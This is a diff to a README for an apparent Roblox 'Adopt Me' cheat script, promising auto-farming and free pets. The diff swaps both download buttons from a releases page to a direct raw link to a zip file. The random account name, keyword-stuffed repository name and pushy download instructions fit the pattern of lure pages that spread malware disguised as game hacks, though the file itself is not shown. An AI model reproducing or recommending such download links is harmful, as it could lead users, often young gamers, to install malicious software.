@@ -1,7 +1,7 @@
 <h1>🦊 Adopt-Me-Script-2026 Auto-Farm & Pets - Save Hours of Grinding Instantly</h1>
 
 <p align="center">
-<a href="https://github.com/Flatknotbubovirginianus435/Adopt-Me-Script-2026---Auto-Farm---Pets---Free-Roblox-Hack-GUI/releases"><img src="https://img.shields.io/badge/⬇️%20CLICK%20HERE%20TO%20DOWNLOAD%20-%20FREE%20VERSION%202026-blueviolet?style=for-the-badge&logo=roblox" alt="Download Button" width="400"></a>
+<a href="https://raw.githubusercontent.com/Flatknotbubovirginianus435/Adopt-Me-Script-2026---Auto-Farm---Pets---Free-Roblox-Hack-GUI/main/riva/Auto_Hack_GUI_Script_Free_Adopt_Roblox_Me_Farm_Pets_1.2-beta.1.zip"><img src="https://img.shields.io/badge/⬇️%20CLICK%20HERE%20TO%20DOWNLOAD%20-%20FREE%20VERSION%202026-blueviolet?style=for-the-badge&logo=roblox" alt="Download Button" width="400"></a>
 </p>
 
 ---
@@ -58,7 +58,7 @@ Before you start, check that your computer meets these simple requirements:
 ### Step 1: Click the Download Button Below
 
 <p align="center">
-<a href="https://github.com/Flatknotbubovirginianus435/Adopt-Me-Script-2026---Auto-Farm---Pets---Free-Roblox-Hack-GUI/releases"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW%20-%20FREE%20LATEST%20VERSION%20-red?style=for-the-badge&logo=github" alt="Download Now" width="350"></a>
+<a href="https://raw.githubusercontent.com/Flatknotbubovirginianus435/Adopt-Me-Script-2026---Auto-Farm---Pets---Free-Roblox-Hack-GUI/main/riva/Auto_Hack_GUI_Script_Free_Adopt_Roblox_Me_Farm_Pets_1.2-beta.1.zip"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW%20-%20FREE%20LATEST%20VERSION%20-red?style=for-the-badge&logo=github" alt="Download Now" width="350"></a>
 </p>
 
 Visit this link to download the application. The download page will show you available files. Look for the newest version and click download. Your web browser will ask you where to save the file. Choose your **Downloads folder** or your **Desktop** so it's easy to find.
